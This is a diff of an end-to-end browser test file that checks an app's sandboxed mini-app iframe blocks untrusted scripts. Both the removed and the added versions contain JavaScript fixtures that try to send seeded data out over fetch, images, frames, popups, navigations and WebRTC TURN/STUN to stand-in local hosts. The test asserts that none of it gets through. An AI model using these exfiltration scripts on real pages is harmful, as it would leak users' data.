@@ -1,15 +1,16 @@
-"""Mini-app frame isolation on the Agent screen (spec agent-panel-code-mode, G7 and Phase 5) against the running app.
+"""Mini-apps on the Agent screen (spec agent-panel-code-mode, G7, Phase 5 and D14) against the running app.
 
-The exploration and its mini-app HTML are seeded straight into the stack's store (no model call, no sandbox run).
-The mini-app tries every way out it has: fetch, an image, a child frame, a popup, a top-level link and, last, a
-navigation of its own frame, to the app's own API and to another host (the last one per run, so twice). No request may leave either
-frame, and only its one `ask` message may reach the screen."""
+Explorations and their mini-apps are seeded straight into the stack's store (no model call, no sandbox run). The frame
+is `sandbox=""`, so nothing in it runs: a script put back into its srcdoc tries fetch to the app's API, WebRTC to a
+TURN and a STUN server carrying the data, and messages to the screen, and none of it happens. Follow-up questions are
+Ask chips outside the frame."""
 
+import contextlib
 import json
 import os
+import socket
 import threading
 import time
-from http.server import BaseHTTPRequestHandler, HTTPServer
 from pathlib import Path
 
 import pytest
@@ -18,28 +19,26 @@ from arp.agent.explorations import ExplorationStore
 
 URL = os.environ.get("ARP_E2E_URL")
 API = os.environ.get("ARP_E2E_API_URL", "http://localhost:8000")  # the stack's API (e2e_stack.sh)
-LOGS = [Path(os.environ.get("TMPDIR", "/tmp")) / "arp-e2e" / name for name in ("api.log", "web.log")]  # e2e_stack.sh's
 DSN = os.environ.get("ARP_POSTGRES_DSN", "postgresql+psycopg://arp:arp@localhost:5432/arp_test")  # e2e_stack.sh's default
+LOGS = [Path(os.environ.get("TMPDIR", "/tmp")) / "arp-e2e" / name for name in ("api.log", "web.log")]  # e2e_stack.sh's
 pytestmark = [
     pytest.mark.e2e,
     pytest.mark.skipif(not URL, reason="ARP_E2E_URL not set -- start backend/scripts/e2e_stack.sh"),
 ]
 
-MINIAPP = """<p id="out">loading</p><script>
-var targets = TARGETS, d = encodeURIComponent(JSON.stringify(window.ARP_DATA));
-fetch(targets[0]).then(function () { parent.postMessage({action: "ask", text: "fetch reached the API"}, "*"); },
-  function () {
-    parent.postMessage({action: "run", plan_id: "x"}, "*");
-    parent.postMessage({action: "ask", text: "why sector X? fetch failed"}, "*");
-    targets.forEach(function (t, n) {
-      var img = document.createElement("img"); img.src = t + "?img=" + d; document.body.append(img);
-      var f = document.createElement("iframe"); f.src = t + "?frame=" + d; document.body.append(f);
-      try { window.open(t + "?open=" + d); } catch (e) {}
-      var a = document.createElement("a"); a.href = t + "?top=" + d; a.target = "_top"; document.body.append(a); a.click();
-      try { parent.location.href = t + "?parent=" + d; } catch (e) {}
-    });
-    setTimeout(function () { location.href = SELF + "?self=" + d; }, 100);  // last: it ends this page if it goes
-  });
+RESULT = [{"holding": "secret-co", "weight": 0.3}]
+# What a mini-app script would try if one ran: the data out over fetch and WebRTC, and messages to the screen.
+ESCAPE = """<script>
+var d = JSON.stringify(%(data)s);
+document.body.textContent = "script ran";
+fetch("%(api)s/api/plans?d=" + encodeURIComponent(d));
+var pc = new RTCPeerConnection({iceServers: [
+  {urls: "turn:127.0.0.1:%(port)d?transport=udp", username: d, credential: "x"},
+  {urls: "stun:127.0.0.1:%(port)d"}]});
+pc.createDataChannel("x");
+pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
+parent.postMessage({action: "ask", text: "x"}, "*");
+parent.postMessage({action: "run", plan_id: "x"}, "*");
 </script>"""
 
 
@@ -56,57 +55,77 @@ def page():
         browser.close()
 
 
-@pytest.fixture(scope="module")
-def listener():
-    """Another host: records every request that reaches it."""
-    hits = []
+@pytest.fixture
+def udp():
+    """A TURN/STUN server stand-in: records every packet that reaches it."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(("127.0.0.1", 0))
+    sock.settimeout(0.2)
+    hits, stop = [], threading.Event()
 
-    class Handler(BaseHTTPRequestHandler):
-        def do_GET(self):
-            hits.append(self.path)
-            self.send_response(204)
-            self.end_headers()
+    def serve():
+        while not stop.is_set():
+            with contextlib.suppress(TimeoutError):
+                hits.append(sock.recvfrom(2048)[0])
 
-        def log_message(self, *args):
-            pass
-
-    server = HTTPServer(("127.0.0.1", 0), Handler)
-    threading.Thread(target=server.serve_forever, daemon=True).start()
-    yield f"http://127.0.0.1:{server.server_port}/leak", hits
-    server.shutdown()
+    thread = threading.Thread(target=serve, daemon=True)
+    thread.start()
+    yield sock.getsockname()[1], hits
+    stop.set()
+    thread.join()
+    sock.close()
 
 
-@pytest.fixture(params=["api", "other host"], ids=["self-nav to the app's API", "self-nav to another host"])
-def exploration(request, listener):
-    targets = [f"{API}/api/plans", "/api/plans", listener[0]]  # the app's API, the app's own origin, another host
+def _seed(question, asks):
     store = ExplorationStore(DSN)
-    row = store.add(question="miniapp isolation e2e", code="return []", model="stand-in",
-                    run={"status": "done", "result": [{"holding": "secret-co", "weight": 0.3}], "error": None, "tool_calls": []})
-    store.set_miniapp(row["id"], MINIAPP.replace("TARGETS", json.dumps(targets)).replace(
-        "SELF", json.dumps(targets[0] if request.param == "api" else targets[2])))
+    row = store.add(question=question, code="return []", model="stand-in",
+                    run={"status": "done", "result": RESULT, "error": None, "tool_calls": []})
+    store.set_miniapp(row["id"], "<p>x</p>", asks)
     return row["id"]
 
 
-def test_miniapp_reaches_nothing_and_only_fills_the_composer(page, exploration, listener):
-    seen = {log: log.stat().st_size for log in LOGS}  # the stack's access logs, read from here on
-    popups = []
-    page.context.on("page", lambda p: popups.append(p.url))
+def _open_miniapp(page, exploration):
     page.goto(f"{URL}/#/agent/exploration/{exploration}")
     page.get_by_role("tab", name="Mini-app").first.click()
-    composer = page.locator("#agent-brief")
-    composer.wait_for()
-    page.wait_for_function("document.querySelector('#agent-brief').value.includes('fetch failed')", timeout=10_000)
-    time.sleep(2)  # the navigations run after the message; give each the time a request would take to start
+    page.locator(".agent-stage iframe.agent-miniapp").wait_for()
 
-    assert composer.input_value() == "why sector X? fetch failed"  # the ask landed, the run message did nothing
-    assert listener[1] == []  # nothing reached the other host
-    for log, start in seen.items():  # nor the app: every attempt carries the data, "secret-co" among it
+
+def test_nothing_runs_in_the_frame_even_a_script_put_back(page, udp):  # AC-54c, AC-55, AC-55b, AC-55c, AC-57, AC-57b
+    port, packets = udp
+    _open_miniapp(page, _seed("miniapp isolation e2e", []))
+    frame = page.locator(".agent-stage iframe.agent-miniapp")
+    assert frame.get_attribute("sandbox") == ""
+    seen = {log: log.stat().st_size for log in LOGS}  # the stack's access logs, read from the swap on
+    script = ESCAPE % {"data": json.dumps(RESULT), "api": API, "port": port}
+    frame.evaluate("(f, s) => { f.srcdoc = f.srcdoc.replace('</body>', s + '</body>'); }", script)
+    time.sleep(5)
+
+    assert "script ran" not in page.frame_locator(".agent-stage iframe.agent-miniapp").locator("body").inner_text()
+    assert packets == []  # no TURN or STUN packet
+    for log, start in seen.items():  # no request carrying the data reached the app
         with log.open("rb") as f:
             f.seek(start)
             assert b"secret-co" not in f.read(), log.name
-    assert popups == []
-    assert page.url.startswith(URL) and "/agent/exploration/" in page.url  # the app page was not navigated
-    assert page.frame_locator("iframe.agent-miniapp").locator("iframe").count() == 1  # the shell still holds the mini-app
+    assert page.locator("#agent-brief").input_value() == ""  # neither message reached the screen
+
+
+def test_an_ask_chip_fills_the_composer_in_ask_mode_and_sends_nothing(page):  # AC-54d, AC-56, AC-56b, AC-56c
+    _open_miniapp(page, _seed("miniapp chips e2e", ["why sector X?"]))
+    page.get_by_role("group", name="Mode").get_by_role("button", name="Plan").click()
+    page.locator("#agent-brief").fill("old")
+    assert page.frame_locator(".agent-stage iframe.agent-miniapp").get_by_text("why sector X?").count() == 0
+    seen = {log: log.stat().st_size for log in LOGS}
+    page.locator(".agent-stage").get_by_role("button", name="why sector X?").click()
+    time.sleep(2)
+
+    assert page.locator("#agent-brief").input_value() == "why sector X?"
+    assert page.get_by_role("group", name="Mode").get_by_role("button", name="Ask").get_attribute("aria-pressed") == "true"
+    for log, start in seen.items():
+        with log.open("rb") as f:
+            f.seek(start)
+            sent = f.read()
+        for route in (b"POST /api/agent/asks", b"POST /api/plans", b"POST /api/agent/explorations"):
+            assert route not in sent, (log.name, route)
 
 
 @pytest.fixture
@@ -117,11 +136,11 @@ def plain():
 
 
 def _answer_miniapp(page, exploration, ok):
-    """The stack has no model: the route's answer is stored here, as the real route would, or it fails with 502."""
+    """The stack has no model: the route's answer is stored here, as the real route would, or it fails with 500."""
     def handle(route):
         if not ok:
-            return route.fulfill(status=502, json={"detail": "no mini-app was written: test"})
-        row = ExplorationStore(DSN).set_miniapp(exploration, "<p>hi</p>")
+            return route.fulfill(status=500, json={"detail": "no stand-in mini-app for test in miniapp.json"})
+        row = ExplorationStore(DSN).set_miniapp(exploration, "<p>hi</p>", [])
         route.fulfill(status=200, content_type="application/json", body=json.dumps(row, default=str))
     page.route(f"**/api/agent/explorations/{exploration}/miniapp", handle)
 
@@ -131,6 +150,7 @@ def test_show_as_miniapp_moves_focus_to_the_selected_miniapp_tab(page, plain, wi
     page.set_viewport_size({"width": width, "height": 900})
     _answer_miniapp(page, plain, ok=True)
     page.goto(f"{URL}/#/agent/exploration/{plain}")
+    assert page.locator("#agent-show-miniapp").inner_text() == "Show as mini-app"  # AC-55e
     page.locator("#agent-show-miniapp").focus()
     page.keyboard.press("Enter")
     page.wait_for_function("document.activeElement && document.activeElement.dataset.tab === 'miniapp'", timeout=10_000)
@@ -138,7 +158,8 @@ def test_show_as_miniapp_moves_focus_to_the_selected_miniapp_tab(page, plain, wi
         return {selected: e.getAttribute('aria-selected'), visible: !!e.offsetParent, inDrawer: !!e.closest('#agent-drawer')}; }""")
     assert focused == {"selected": "true", "visible": True, "inDrawer": width < 900}
     shown = page.frame_locator("dialog iframe.agent-miniapp" if width < 900 else ".agent-stage iframe.agent-miniapp")
-    shown.frame_locator("iframe").locator("p").wait_for()  # the stored page shows in the stage that has focus
+    shown.locator("p").wait_for()  # the stored page shows in the stage that has focus
+    assert page.locator("#agent-show-miniapp").inner_text() == "Regenerate mini-app"  # AC-55f
 
 
 def test_closing_the_drawer_show_as_miniapp_opened_returns_focus_to_the_button(page, plain):  # WCAG 2.4.3, below 900 px
